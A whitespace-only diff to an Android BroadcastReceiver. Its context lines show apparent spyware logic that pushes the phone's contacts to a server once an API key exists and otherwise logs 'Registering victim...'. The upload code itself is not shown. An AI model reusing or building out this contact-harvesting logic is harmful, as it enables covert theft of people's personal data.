@@ -26,6 +26,8 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 
         Log.i(X, "Network changed...");
 
+
+
         if (NetworkUtils.hasNetwork(context)) {
 
             Log.i(X, "Has network");
@@ -36,8 +38,10 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
             Log.d(X, "hasApiKey ? " + hasApiKey);
 
             if (hasApiKey) {
+
                 //Do the jobs here
                 ContactUtils.push(context);
+
             } else {
 
                 Log.i(X, "Registering victim...");
